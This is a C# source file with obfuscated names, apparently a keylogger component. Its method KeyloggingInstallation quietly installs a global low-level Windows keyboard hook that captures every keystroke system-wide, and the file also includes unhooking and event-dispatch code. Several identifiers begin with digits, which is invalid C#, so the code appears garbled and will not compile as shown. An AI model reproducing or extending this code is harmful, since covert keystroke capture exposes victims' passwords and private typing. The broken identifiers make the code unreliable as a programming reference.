using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Ch9qVeSrN4
{
	public class Cc1E7of1Vi
	{
		public Cc1E7of1Vi()
		{
			this.jOCSsKkm = new Cc1E7of1Vi.Vop0z(this.xdAmqVQE6gO);
		}

		public event Cc1E7of1Vi.gbg KeyDown
		{
			add
			{
				Cc1E7of1Vi.gbg currentHandler;
				Cc1E7of1Vi.gbg newHandler;

				do
				{
					currentHandler = this.Lj4FDY3n1;
					newHandler = (Cc1E7of1Vi.gbg)Delegate.Combine(currentHandler, value);
				}
				while (Interlocked.CompareExchange(
						   ref this.Lj4FDY3n1,
						   newHandler,
						   currentHandler) != currentHandler);
			}

			remove
			{
				Cc1E7of1Vi.gbg currentHandler;
				Cc1E7of1Vi.gbg newHandler;

				do
				{
					currentHandler = this.Lj4FDY3n1;
					newHandler = (Cc1E7of1Vi.gbg)Delegate.Remove(currentHandler, value);
				}
				while (Interlocked.CompareExchange(
						   ref this.Lj4FDY3n1,
						   newHandler,
						   currentHandler) != currentHandler);
			}
		}


		public event Cc1E7of1Vi.ElQkX KeyUp
		{
			add
			{
				Cc1E7of1Vi.ElQkX currentHandler;
				Cc1E7of1Vi.ElQkX newHandler;

				do
				{
					currentHandler = this.35HNYqpmb5;
					newHandler = (Cc1E7of1Vi.ElQkX)Delegate.Combine(currentHandler, value);
				}
				while (Interlocked.CompareExchange(
						   ref this.35HNYqpmb5,
						   newHandler,
						   currentHandler) != currentHandler);
			}

			remove
			{
				Cc1E7of1Vi.ElQkX currentHandler;
				Cc1E7of1Vi.ElQkX newHandler;

				do
				{
					currentHandler = this.35HNYqpmb5;
					newHandler = (Cc1E7of1Vi.ElQkX)Delegate.Remove(currentHandler, value);
				}
				while (Interlocked.CompareExchange(
						   ref this.35HNYqpmb5,
						   newHandler,
						   currentHandler) != currentHandler);
			}
		}

		private int xdAmqVQE6gO(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode < 0)
				return Cc1E7of1Vi.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);

			int message = wParam.ToInt32();
			Cc1E7of1Vi.BcKTd0 hookStruct =
				(Cc1E7of1Vi.BcKTd0)Marshal.PtrToStructure(lParam, typeof(Cc1E7of1Vi.BcKTd0));

			switch (message)
			{
				case 256: // WM_KEYDOWN
				case 260: // WM_SYSKEYDOWN
					if (this.Lj4FDY3n1 != null)
						this.Lj4FDY3n1((Keys)hookStruct.vmo);
					break;

				case 257: // WM_KEYUP
				case 261: // WM_SYSKEYUP
					if (this.35HNYqpmb5 != null)
						this.35HNYqpmb5((Keys)hookStruct.vmo);
					break;

				case 258: // WM_CHAR
				case 259: // WM_SYSCHAR
				default:
					break;
			}

			return Cc1E7of1Vi.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
		}

		public void KeyloggingInstallation()
	{
		int attempts = 0;

		while (attempts <= 10) 
		{
			try
			{
				string moduleName = Process.GetCurrentProcess().MainModule.ModuleName;
				IntPtr moduleHandle = Cc1E7of1Vi.GetModuleHandle(moduleName);
				this.rUBiDaXJL = Cc1E7of1Vi.SetWindowsHookEx(13, this.jOCSsKkm, moduleHandle, 0);

				if (this.rUBiDaXJL != IntPtr.Zero)
				{
					return;
				}
			}
			catch
			{
				
			}

			attempts++;
		}
	}

	public void I4HG1()
	{
		if (this.rUBiDaXJL != IntPtr.Zero)
		{
			Cc1E7of1Vi.UnhookWindowsHookEx(this.rUBiDaXJL);
			this.rUBiDaXJL = IntPtr.Zero;
		}
	}

	protected override void Finalize()
	{
		try
		{
			if (this.rUBiDaXJL != IntPtr.Zero)
			{
				Cc1E7of1Vi.UnhookWindowsHookEx(this.rUBiDaXJL);
				this.rUBiDaXJL = IntPtr.Zero;
			}
		}
		finally
		{
			base.Finalize();
		}
	}

	[DllImport("user32.dll")]
		private static extern IntPtr SetWindowsHookEx(int idHook, Cc1E7of1Vi.Vop0z HookProc, IntPtr hInstance, int wParam);
		[DllImport("user32.dll")]
		private static extern int CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);
		[DllImport("user32.dll")]
		private static extern bool UnhookWindowsHookEx(IntPtr idHook);
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);
		private const int QKZpHhiHo = 13;
		private const int igccX841 = 0;
		private const int l3FlekEJpe = 256;
		private const int ypkUP9ROOZ = 257;
		private const int QfWcRV8E1 = 260;
		private const int GVi = 261;
		private Cc1E7of1Vi.gbg Lj4FDY3n1;
		private Cc1E7of1Vi.ElQkX 35HNYqpmb5;
		private readonly Cc1E7of1Vi.Vop0z jOCSsKkm;
		private IntPtr rUBiDaXJL = IntPtr.Zero;
		public delegate void gbg(Keys Key);
		public delegate void ElQkX(Keys Key);
		private delegate int Vop0z(int nCode, IntPtr wParam, IntPtr lParam);
		private struct BcKTd0
		{
			public uint vmo;
			public uint jVOvqLY;
			public Cc1E7of1Vi.y25pPLD 3mImU2w;
			public uint OSAJG;
			public UIntPtr 4iJ8Sgba;
		}

		[Flags]
		private enum y25pPLD
		{
			A5qc = 1,
			dY4bUNaYZbG = 16,
			W0wdmeb = 32,
			bqm = 128
		}
	}
}
